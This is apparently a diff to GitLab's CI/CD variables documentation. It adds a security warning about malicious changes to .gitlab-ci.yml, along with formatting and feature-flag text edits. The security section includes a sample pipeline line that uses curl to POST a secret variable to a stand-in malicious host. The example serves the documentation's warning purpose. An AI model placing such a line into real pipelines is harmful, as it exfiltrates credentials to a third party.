@@ -131,15 +131,34 @@ After you set a variable, call it from the `.gitlab-ci.yml` file:
 test_variable:
   stage: test
   script:
-    - echo $CI_JOB_STAGE # calls a predefined variable
-    - echo $TEST # calls a custom variable of type `env_var`
-    - echo $GREETING # calls a custom variable of type `file` that contains the path to the temp file
-    - cat $GREETING # the temp file itself contains the variable value
+    - echo $CI_JOB_STAGE  # calls a predefined variable
+    - echo $TEST          # calls a custom variable of type `env_var`
+    - echo $GREETING      # calls a custom variable of type `file` that contains the path to the temp file
+    - cat $GREETING       # the temp file itself contains the variable value
 ```
 
 The output is:
 
 ![Output custom variable](img/custom_variables_output.png)
+
+Variables can only be updated or viewed by project members with [maintainer permissions](../../user/permissions.md#project-members-permissions).
+
+#### Security
+
+Malicious code pushed to your `.gitlab-ci.yml` file could compromise your variables and send them to a third party server regardless of the masked setting. If the pipeline runs on a [protected branch](../../user/project/protected_branches.md) or [protected tag](../../user/project/protected_tags.md), it could also compromise protected variables.
+
+All merge requests that introduce changes to `.gitlab-ci.yml` should be reviewed carefully before:
+
+- [Running a pipeline in the parent project for a merge request submitted from a forked project](../merge_request_pipelines/index.md#run-pipelines-in-the-parent-project-for-merge-requests-from-a-forked-project).
+- Merging the changes.
+
+Here is a simplified example of a malicious `.gitlab-ci.yml`:
+
+```yaml
+build:
+  script:
+    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" https://maliciouswebsite.abcd/
+```
 
 ### Custom environment variables of type Variable
 
@@ -215,8 +234,8 @@ You can't mask variables that don't meet these requirements.
 > Introduced in GitLab 9.3.
 
 Variables can be protected. When a variable is
-protected, it is securely passed to pipelines running on
-[protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md) only. The other pipelines do not get
+protected, it is only passed to pipelines running on
+[protected branches](../../user/project/protected_branches.md) or [protected tags](../../user/project/protected_tags.md). The other pipelines do not get
 the protected variable.
 
 To protect a variable:
@@ -227,8 +246,7 @@ To protect a variable:
 1. Select the **Protect variable** check box.
 1. Click **Update variable**.
 
-The variable is available for all subsequent pipelines. Protected variables can only
-be updated or viewed by project members with [maintainer permissions](../../user/permissions.md#project-members-permissions).
+The variable is available for all subsequent pipelines.
 
 ### Custom variables validated by GitLab
 
@@ -493,7 +511,7 @@ build:
 deploy:
   stage: deploy
   script:
-    - echo $BUILD_VERSION # => hello
+    - echo $BUILD_VERSION  # => hello
   dependencies:
     - build
 ```
@@ -512,7 +530,7 @@ build:
 deploy:
   stage: deploy
   script:
-    - echo $BUILD_VERSION # => hello
+    - echo $BUILD_VERSION  # => hello
   needs:
     - job: build
       artifacts: true
@@ -744,7 +762,11 @@ so `&&` is evaluated before `||`.
 
 #### Parentheses
 
-> [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/230938) in GitLab 13.3
+> - [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/230938) in GitLab 13.3
+> - It's deployed behind a feature flag, enabled by default.
+> - It's enabled on GitLab.com.
+> - It's recommended for production use.
+> - For GitLab self-managed instances, GitLab administrators can opt to [disable it](#enable-or-disable-parenthesis-support-for-variables). **(CORE ONLY)**
 
 It is possible to use parentheses to group conditions. Parentheses have the highest
 precedence of all operators. Expressions enclosed in parentheses are evaluated first,
@@ -760,20 +782,22 @@ Examples:
 - `($VARIABLE1 =~ /^content.*/ || $VARIABLE2 =~ /thing$/) && $VARIABLE3`
 - `$CI_COMMIT_BRANCH == "my-branch" || (($VARIABLE1 == "thing" || $VARIABLE2 == "thing") && $VARIABLE3)`
 
+##### Enable or disable parenthesis support for variables **(CORE ONLY)**
+
 The feature is currently deployed behind a feature flag that is **enabled by default**.
 [GitLab administrators with access to the GitLab Rails console](../../administration/feature_flags.md)
 can opt to disable it for your instance.
-
-To enable it:
-
-```ruby
-Feature.enable(:ci_if_parenthesis_enabled)
-```
 
 To disable it:
 
 ```ruby
 Feature.disable(:ci_if_parenthesis_enabled)
+```
+
+To enable it:
+
+```ruby
+Feature.enable(:ci_if_parenthesis_enabled)
 ```
 
 ### Storing regular expressions in variables
